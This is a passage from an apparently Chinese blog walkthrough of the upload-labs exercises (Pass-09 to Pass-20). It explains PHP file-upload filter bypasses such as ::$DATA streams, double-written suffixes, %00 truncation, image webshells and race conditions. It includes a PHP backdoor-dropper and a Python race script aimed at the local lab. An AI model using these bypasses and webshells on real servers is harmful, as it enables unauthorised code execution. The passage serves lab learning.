</span></span></code></pre></td></tr></table>
</div>
</div><p><code>a.php. </code>可以带空格</p>
<p>上传。</p>
<p><strong>F2：利用Windows解析漏洞（后缀修改为1.php:1.jpg）</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1.php:1.jpg
</span></span></code></pre></td></tr></table>
</div>
</div><p>没成功： 上传的是<code>1.php</code>，但是文件内容是空的了</p>
<p>​</p>
<p>​</p>
<h2 id="pass-09">Pass-09</h2>
<blockquote>
<p>Windows文件流绕过</p>
</blockquote>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218152924608_961861669.png" />
<p>少了 <code>$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA</code>    &ndash;&gt; 含义：把后缀中是 ::DATA替换为空</p>
<p><code>str_ireplace('要替换的对象','替换为','字符串')</code>函数</p>
<p>由上可知，文件<code>没有对后缀名进行去”::DATA”处理</code>。</p>
<p>php在window的时候如果文件名+&quot;::DATA”处理。php在window的时候如果文件名+&quot;::DATA”处理。php在window的时候如果文件名+&quot;::DATA&quot;会把::DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::DATA&quot;之前的文件名 他的目的就是不检查后缀名。</p>
<blockquote>
<p>ps:只能是Windows系统，并且只能时php文件</p>
</blockquote>
<h6 id="绕过-8">绕过</h6>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">info.php::$DATA
</span></span></code></pre></td></tr></table>
</div>
</div><p>1.如图 ，在BP中修改图片马的 jpg 的后缀名，将其改为 php ，并且在后面加上 ::$DATA ;</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218161807873_1645216989.png" />
<p>2.在网页上检查图片马的执行情况时，将图片马的后缀名中 ::$DATA ，删去，便可浏览。</p>
<p>如图，这个是没有去掉后缀时，会发生报错。（因为我们实际上传的是PHP文件，即upload文件夹中只有php文件，而不存在带有后缀 ::$DATA的文件）</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218162201913_251841335.png" />
<h1 id="pass-10---11-将filename拼接路径会带来极大风险">Pass 10 - 11 （将filename拼接路径会带来极大风险）</h1>
<h2 id="pass-10">Pass-10</h2>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218163307924_285954321.png" />
<h6 id="绕过-9">绕过</h6>
<p><strong>构造后缀名点空绕过</strong></p>
<p><code>strrchr</code>函数 搜索参数在字符串中的位置，并返回从该位置到字符串结尾的所有字符</p>
<p>如果有多个，匹配的是最后一个（前面的就会漏掉</p>
<p>由上可知，该关进行的是现在文件末尾先去点，再去空便没有再做任何处理，因此我们可以利用这个漏洞，构造后缀名为php+点+空+点</p>
<p>burp修改文件名<code>info.php. .</code></p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218163126238_1032488863.png" />
<h2 id="pass-11">Pass-11</h2>
<blockquote>
<p>双写绕过</p>
</blockquote>
<p>没有strrchr</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218163843491_1975433720.png" />
<p>str_ireplace函数：</p>
<p><code>str_ireplace('要替换的对象','替换为','字符串')</code>,   他把我们的php后缀替换为空</p>
<p><strong>函数缺陷：</strong></p>
<p>只是执行一次/或者没采用递归过滤</p>
<h6 id="绕过-10">绕过</h6>
<p>扰乱，删除里面后，外面还能组合成功后缀</p>
<p>burp修改filename=<code>info.pphphp</code></p>
<p>info.pphphp &mdash; &gt; &lsquo;info.php&rsquo;</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218163953790_921378631.png" />
<h1 id="pass-12---13-将filename当做变量加入最终路径会带来极大风险">Pass 12 - 13 将filename当做变量加入最终路径会带来极大风险</h1>
<h2 id="pass---12">Pass - 12</h2>
<blockquote>
<p>GET请求，URL网页上00截断</p>
</blockquote>
<blockquote>
<p>前提条件：php5.34以下， magic_quotes_gpc为off状态</p>
</blockquote>
<p><strong>魔术引号 magic_quotes_gpc 作用</strong>： 对（反斜杠？，单引号，双引号，none）产生影响, 自动加上/</p>
<p><strong>白名单绕过</strong></p>
<p>)<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218165050537_741059186.png" /></p>
<p>save_path可控， <code>$_GET['save_path']</code> 通过get获取，可以把get中url参数带上00截断</p>
<p>%00 截断（类似注释符号，后面的不再执行）</p>
<blockquote>
<p>Note： %00 是URL编码后的结果， 选中，解码转换（url decode）为小方块，才是真正的%00, Hex下是00</p>
</blockquote>
<p>数据包中 <code>save_path=../upload/shell.php%00</code> （注意 url_decode）后面的就没用了，filename=&ldquo;shell.jpg&rdquo;</p>
<p>由源码可知，图片的save_path通过get传递，然后和后缀ima_path直接拼接而成的，所以我们可以直接使用 %00 截断，将后缀名 .jpg 截断，从而以 php 运行</p>
<h6 id="绕过-11">绕过</h6>
<p>URI中00截断</p>
<p><strong>方法一：拦包00截断</strong></p>
<p>由于是在get的url中，<code>%00</code>就不进行decode了，</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218170335768_2032329037.png" />
<p>上传成功：</p>
<p>查看图片路径：</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218170644694_1142415094.png" />
<p>查看服务器保存文件：</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218170437679_903547409.png" />
<p>访问的时候，去掉后面的jpg，只访问php，OK：</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218170513646_522012281.png" />
<p><strong>方法二：前端直接修改为 &ldquo;php+00截断&quot;格式</strong></p>
<p>如下可得，直接将参数save_path修改为php+00截断的格式，因此它会将之后上传的所有文件以PHP的格式进行解析。</p>
<p>ps:图片是盗取的</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218170957259_1424254637.png" />
<p>burp只修改下面的filename为<code>x.jpg</code>即可</p>
<h2 id="pass---13">Pass - 13</h2>
<blockquote>
<p>POST请求，00截断</p>
</blockquote>
<p><strong>白名单绕过</strong></p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218165118835_726563878.png" />
<p><strong>F1:</strong></p>
<p>同12关，只是修改的地方不同</p>
<p>**1.**burp拦截。在post后面加上<code>info.php%00</code> (%00是url decode之后的)，再发送即可</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218172018042_1656668337.png" />
<p>**2.**burp拦截，然后在上面的upload 的后面加上 <code>123.php+</code>（这里的123可以为任何名字，他只是一个代号。并且 php后面的 <code>+ </code>好也是一个标记，他的二进制代码为 <code>2b</code>）</p>
<p>由上可知，将二进制中的 + 改为 00 截断，即将 + 的二进制码 2b 改为 <code>00</code> .</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218171415601_503298826.png" />
<p>同样，访问的时候访问php文件：</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218171807564_1778234073.png" />
<p><strong>F2 意外发现：文件覆盖</strong></p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218172227317_2113414909.png" />
<p>由于名字可以不相同，即我们可以任意定义uploads旁边的 PHP 文件名，如果将文件名改为uploads中本身存在的文件，那么新的文件将会覆盖原来的文件。</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218172321670_308115506.png" />
<h2 id="pass---20-也是类似的便于比较就放这里了">Pass - 20 （也是类似的，便于比较就放这里了）</h2>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218172852998_939565232.png" />
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218172525227_655899960.png" />
<p>这里进行过滤的是他的那个文件名，而不是我们上传文件最开始的文件名，所以要在他的文件名上做手脚</p>
<p><code>$file_ext = pathinfo($file_name,PATHINFO_EXTENSION)</code>   返回拓展后缀</p>
<p>这里的文件名<code>filename</code>是可控的：  <code>$_POST['save_name']</code></p>
<h6 id="绕过-12">绕过</h6>
<p>我们可以在save_path中加入php+00截断，由于是POST发送方式，因此我们需进行00截断。<code>111.php%00upload-19.jpg</code> （注意url decode）</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218174147577_857047164.png" />
<p>上传OK：</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218174246606_1092693624.png" />
<p>去掉00后面内容，访问php，正常解析</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218174323338_682125752.png" />
<h1 id="pass14---17-文件包含漏洞">Pass14 - 17 （文件包含漏洞）</h1>
<h2 id="pass---14">Pass - 14</h2>
<blockquote>
<p>获取文件头进行了验证</p>
</blockquote>
<p><strong>图片马制作：</strong></p>
<p>win下：copy a.jpg /b + b.php /a shell.jpg</p>
<p>Linux下：cat a.jpg b.php &gt; shell.jpg</p>
<p>文件包含漏洞（xx.php?file=uploads/x.jpg） 文件不限格式后缀</p>
<p><strong>意义</strong>：如果存在包含漏洞，需要上传一张图片(图片马)，就可以getshell</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218175651617_999905544.png" />
<p><code>$strInfo = @unpack(&quot;C2chars&quot;, $bin);</code>// C为无符号整数，网上搜到的都是c，为有符号整数，这样会产生负数判断不正常</p>
<p><code>$bin = fread($file, 2);</code> //只读2字节进行验证</p>
<p>表示只是对文件头做了检测</p>
<p><code>$strInfo = @unpack(&quot;C2chars&quot;, $bin);</code> 标示前两个字符按照，c格式，数组索引chars1,chars2                @unpack</p>
<p><code>$typeCode = intval($strInfo['chars1'].$strInfo['chars2']);</code></p>
<p><strong>文件头：</strong> 不同后缀类型文件头部代码中有GIF89a,NG,PK,7Z， 部分验证会验证文件头</p>
<blockquote>
<p>常见文件头：https://blog.csdn.net/xiangshangbashaonian/article/details/80156865</p>
</blockquote>
<p><strong>突破：</strong> 伪造可行的文件头</p>
<h6 id="绕过-13">绕过</h6>
<p>上传图片马，上传。打开测试页面，引用刚才的图片马</p>
<h2 id="pass---15----getimagesize">Pass - 15    getimagesize</h2>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218185841047_937742626.png" />
<p>函数拓展：<code>getimagesize（）</code>   判断是否为一个完整的图像</p>
<p>索引2<code>$info[2]</code> 是图像的类型</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218185758469_1439877358.png" />
<p>image_type_to_extension 获取的是MIME类型</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$info = getimagesize($filename);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ext = image_type_to_extension($info[2]);  # 获取后缀jpeg  ,   $info[2] 是文件类型
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">if(stripos($types,$ext)&gt;=0)  # 是否在白名单中
</span></span></code></pre></td></tr></table>
</div>
</div><h6 id="绕过-14">绕过</h6>
<p>上传图片马，</p>
<p>打开测试页面，直接包含<code>include</code>file=&lsquo;文件.jpg&rsquo;, 就是当成php解析</p>
<h2 id="pass---16---php_exif模块">Pass - 16   php_exif模块</h2>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218185919196_54375063.png" />
<p>函数拓展：<code>exif_imagetype（）</code></p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218190317887_1240325255.png" />
<p>php_exif模块来判断文件类型</p>
<p>版本：PHP&gt;=4.3.0,  PHP5, PHP7</p>
<h6 id="绕过-15">绕过</h6>
<p>需要开启<code>php_exif</code>模块：</p>
<p>1.打开配置文件，php拓展，<code>php_exif</code>打开；</p>
<p>2.配置文件在<code>php.ini</code>,分号是注释，可以直接解除注释启用,并将此行移动到extension=php_exif.dll之前，使之首先加载*。</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218220405641_1769279545.png" />
<p>上传图片马（注意MIME与后缀和文件头要一直，然后打开测试页面，包含gif，OK</p>
<h2 id="pass---17---图片二次编码">Pass - 17   （图片二次编码）</h2>
<p>其实就是检测两次</p>
<p><strong>本质：</strong> 检测 MIME和后缀是否对应</p>
<p><strong>原理：</strong> 将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。</p>
<p>具体实现需要<code>自己编写Python程序</code>，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//使用上传的图片生成新的图片
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> $im = imagecreatefromjpeg($target_path);
</span></span></code></pre></td></tr></table>
</div>
</div><h6 id="绕过-16">绕过</h6>
<p>好了，还是太菜，还是看大佬的解决方案学习学习把吧:<a href="https://xz.aliyun.com/t/2657"target="_blank" rel="external nofollow noopener noreferrer">点击这里<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
<p><strong>1.GIF</strong></p>
<p>关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了.</p>
<p><strong>2.PNG</strong></p>
<p>png的二次渲染的绕过并不能像gif那样简单.</p>
<p><strong>3.JPG</strong></p>
<blockquote>
<p>ps: 这一关是二次渲染的，还是多学习学习吧</p>
</blockquote>
<h1 id="18--19-条件竞争-多线程发包">18 -19 条件竞争 （多线程发包）</h1>
<h2 id="pass---18">Pass - 18</h2>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218222155590_1020797820.png" />
<p><code>unlink</code>函数：   数删除文件。若成功，则返回 true，失败则返回 false</p>
<p><strong>执行步骤：</strong></p>
<p>1.取出上传文件的后缀名</p>
<p>2.临时文件移动（<code>move_uploaded_file</code>）到一个路径下面，</p>
<p>3.如果后缀名在白名单，进行最后移动，保存</p>
<p>4.如果后缀名不在白名单，<code>unlink</code>删除临时文件</p>
<h6 id="绕过-17">绕过</h6>
<blockquote>
<p>趁他不注意（多线程），在临时文件里面写一个创建后门文件的功能，这样虽然临时文件不满足被删除，但是自己自动创建的文件已经存在服务器目录了</p>
</blockquote>
<p><strong>F1：</strong></p>
<p>其中，诱饵上传文件代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;shell.php&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Unable to open file!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$txt</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php  phpinfo();   ?&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span> <span class="nv">$txt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>然后，如果已知新建文件的路径，可以直接访问</p>
<p>​            如果不知道，可以抓取数据包查看</p>
<p><strong>方法：</strong></p>
<p>1.利用burp的Intruder使用多线程发包(如下图)，</p>
<p>2.然后不断在浏览器访问我们的webshell，会有一瞬间的访问成功。（即当线程足够的时候 ，将可能会跳过某个步骤，而直接访问到我们的 webshell，新文件也会创建成功 )</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218222719652_1510553817.png" />
<p><strong>F2:</strong>   Python</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">\<span class="c1">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">\<span class="c1"># coding:utf-8</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hackhttp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">multiprocessing.dummy</span> <span class="kn">import</span> <span class="n">Pool</span> <span class="k">as</span> <span class="n">ThreadPool</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">lists</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">​</span>    <span class="n">hh</span> <span class="o">=</span> <span class="n">hackhttp</span><span class="o">.</span><span class="n">hackhttp</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">​</span>    <span class="n">raw</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;POST /upload-labs/Pass-17/index.php HTTP/1.1
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Host: 127.0.0.1
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Accept-Encoding: gzip, deflate
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Referer: http://127.0.0.1/upload-labs/Pass-18/index.php
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Cookie: pass=18
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Connection: close
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Upgrade-Insecure-Requests: 1
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: multipart/form-data; boundary=---------------------------6696274297634
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Length: 341
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">-----------------------------6696274297634
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Disposition: form-data; name=&#34;upload_file&#34;; filename=&#34;18.php&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: application/octet-stream
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">$myfile = fopen(&#34;shell.php&#34;, &#34;w&#34;) or die(&#34;Unable to open file!&#34;);
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">$txt = &#34;&lt;?php  phpinfo();   ?&gt;</span><span class="se">\n</span><span class="s2">&#34;;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">fwrite($myfile, $txt);
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">fclose($myfile);
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">?&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">-----------------------------6696274297634
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Disposition: form-data; name=&#34;submit&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">上传
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">-----------------------------6696274297634--
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">​</span>    <span class="n">code</span><span class="p">,</span> <span class="n">head</span><span class="p">,</span> <span class="n">html</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">log</span> <span class="o">=</span> <span class="n">hh</span><span class="o">.</span><span class="n">http</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1/upload-labs/Pass-17/index.php&#39;</span><span class="p">,</span> <span class="n">raw</span><span class="o">=</span><span class="n">raw</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">​</span>    <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pool</span> <span class="o">=</span> <span class="n">ThreadPool</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pool</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">upload</span><span class="p">,</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pool</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pool</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>只是把burp换成了python，其他操作方法是一样的</p>
<h6 id="修复问题">修复问题</h6>
<p>应该先判断文件类型，再移动</p>
<h2 id="pass---19">Pass - 19</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cls_rename_file</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">){</span>  <span class="c1">//是否用$im_path成功给$upload_file重命名
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>和第18关有点类似，都对关键进行了重命名，由于我们是利用burp不断的发送相同的包，那么一旦有两个包同时传到这边是，那么系统对一个重命名时，另一个刚好“逃脱”了，那么上传成功。</p>
<h6 id="绕过-18">绕过</h6>
<p>在这关是一个<code>白名单</code>，<code>利用了appche的一个解析漏洞</code>，它会将 “<code>.php.7z</code> 当作<code> .php</code>来解析，而刚好 “ .php.7z ”又属于白名单，</p>
<p>所以上传一个 “ .php.7z ” 的文件，然后 再利用条件竞争漏洞进行多线程不断的发送 “ .php.7z”的文件，</p>
<p>由于版本问题，这次的文件没有上传到upload的文件夹下面，而是上传到 WWW 的文件夹下面，但是不影响，并且这次的文件上传后就<code>不会被删掉</code>，就会保存在 该文件夹下面，这样的话我们将可以<code>稳定的访问到</code>。</p>
<p>可以看到，burp进行多线程发包后，在浏览器一致访问上传文件的地址，一定会有那么一瞬间会访问到（这时，文件里新建webshell的代码执行了，新的后门建立成功了，我们就可以访问后门了）</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218224226603_822814111.png" />
<h1 id="00截断和move_uploaded_file函数">00截断和move_uploaded_file（）函数</h1>
<h2 id="pass---20">Pass - 20</h2>
<p><code>pathinfo(）函数</code>：以数组的形式返回关于文件路径的信息。</p>
<p>pathinfo(path,options)</p>
<p><code>move_uploaded_file(A,B</code>)函数：此函数将会检查文件A是否是合法的上传文件，如果是，将把文件A移动到B的目录下；否则将会返回false，并且不执行任何操作。</p>
<h6 id="绕过-19">绕过</h6>
<p><strong>方法一：</strong>  %00截断 （前面已经写了）</p>
<p><code>111.php%00upload-19.jpg</code>  其中，%00是url-decode之后的</p>
<p><strong>方法二：</strong></p>
<p>利用<code>move_uploaded_file（）函数和黑名单结合</code>存在的漏洞：</p>
